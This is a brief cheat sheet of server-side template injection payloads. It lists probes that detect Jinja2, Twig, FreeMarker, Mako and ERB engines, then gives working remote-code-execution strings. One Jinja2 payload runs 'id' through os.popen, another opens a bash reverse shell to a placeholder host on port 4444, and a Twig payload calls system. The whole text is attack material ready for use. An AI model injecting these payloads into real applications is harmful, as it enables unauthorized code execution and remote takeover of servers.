```
# Detection probes:
{{7*7}}       → 49 = Jinja2/Twig
${7*7}        → 49 = FreeMarker/Mako
<%= 7*7 %>   → 49 = ERB (Ruby)

# Jinja2 RCE:
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/<LHOST>/4444 0>&1"').read()}}

# Twig RCE:
{{['id']|filter('system')}}
```